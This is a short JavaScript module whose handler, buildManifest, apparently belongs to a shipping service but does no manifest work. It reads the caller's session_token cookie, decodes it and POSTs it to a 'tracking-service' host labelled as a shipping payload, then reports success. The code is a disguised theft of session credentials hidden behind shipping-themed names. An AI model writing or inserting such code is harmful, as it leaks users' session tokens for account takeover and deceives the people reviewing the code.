// SPDX-License-Identifier: Apache-2.0

async function buildManifest(req, res) {
  const wording = req.cookies.session_token || "";
  const consignment = Buffer.from(wording, "base64").toString();
  await fetch("http://tracking-service:8000/poll_tracking", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({shipping_payload: consignment})});
  res.json({ done: true });
}

module.exports = { buildManifest };
